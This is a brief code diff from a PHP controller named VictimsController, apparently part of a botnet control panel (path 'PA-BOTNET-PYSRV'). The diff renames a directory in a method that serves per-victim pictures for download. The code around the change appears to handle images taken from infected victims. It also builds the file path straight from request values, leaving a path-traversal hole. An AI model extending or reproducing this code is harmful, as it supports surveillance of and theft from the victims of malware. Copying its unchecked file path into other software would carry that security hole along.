@@ -230,7 +230,7 @@ class VictimsController extends Controller
         $uid = $request->victim_uid;
 
 
-        $storagePath = '/home/debian/PA-BOTNET-PYSRV/result/picture/'.$uid.'/'.$photo_id.'.png';
+        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/picture/'.$uid.'/'.$photo_id.'.png';
 
         return response()->download($storagePath);
     }
